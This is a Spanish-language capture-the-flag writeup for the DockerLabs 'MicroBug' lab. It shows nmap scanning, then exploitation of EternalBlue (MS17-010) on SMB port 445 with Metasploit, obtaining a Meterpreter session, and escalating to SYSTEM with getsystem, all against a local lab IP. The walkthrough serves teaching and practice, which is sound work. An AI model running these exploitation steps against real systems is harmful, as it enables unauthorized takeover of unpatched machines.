# MicroBug (DockerLabs) — Writeup

Dificultad: fácil

Esta máquina es el clásico ejemplo de libro para recordarnos por qué Windows 7 debería estar enterrado bajo siete llaves hace años. Es una pieza de museo que todavía se encuentra en entornos mal configurados, y aquí sirve para refrescar cómo el protocolo SMB, cuando no se parchea, es básicamente una invitación abierta para que cualquiera tome el control total del sistema sin despeinarse.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El ataque es directo y no tiene mucha historia. Primero escaneamos para confirmar que el puerto 445 está activo, verificamos la vulnerabilidad clásica de EternalBlue y lanzamos el exploit con Metasploit para obtener una sesión con privilegios máximos desde el primer momento.

---

## Paso 0: desplegar el laboratorio

```bash
unzip microbug.zip
sudo bash auto_deploy.sh microbug.tar
```

---

## Paso 1: escaneo de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

El escaneo nos devuelve los puertos típicos de un sistema Windows antiguo: 135, 139, 445 y 5000. El que nos interesa es el 445, el puerto de SMB. Es el punto de entrada lógico donde suelen vivir las vulnerabilidades más críticas de Microsoft.

---

## Paso 2: explotación con Metasploit

No hay que complicarse la vida reinventando la rueda. Iniciamos Metasploit, buscamos el módulo de EternalBlue y configuramos los parámetros básicos para apuntar a la IP de la víctima.

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
exploit
```

El exploit funciona a la primera y nos devuelve una sesión de Meterpreter. A mí lo que más me mosquea de esto es lo sencillo que es dejar un sistema totalmente expuesto con un fallo tan conocido desde hace tanto tiempo, pero bueno, para aprender viene de lujo.

---

## Paso 3: escalada de privilegios

Al comprobar quién somos con el comando para listar privilegios, vemos que ya tenemos acceso total. Al ejecutar getsystem en Meterpreter, confirmamos que estamos dentro como SYSTEM, el nivel más alto de privilegios en el entorno de Windows. Ya no hay nada más que hacer, el sistema es nuestro.

```bash
getsystem
shell
whoami
```

---

## Conclusión

Esta máquina es un ejercicio de nostalgia sobre el desastre que supuso EternalBlue. La lección práctica es simple: si tienes un sistema con SMB expuesto y sin los parches de seguridad de hace casi una década, no te han hackeado, te han hecho el favor de enseñarte lo descuidado que tienes el entorno.

Es un recordatorio de que en seguridad, lo básico sigue siendo lo que más mata. Si no mantienes el sistema actualizado, da igual cuántos firewalls pongas delante, porque por el puerto 445 te van a entrar hasta la cocina sin hacer ruido.

---

Basado en el writeup de d4fl0n: https://d4fl0n.github.io/posts/MicroBug/
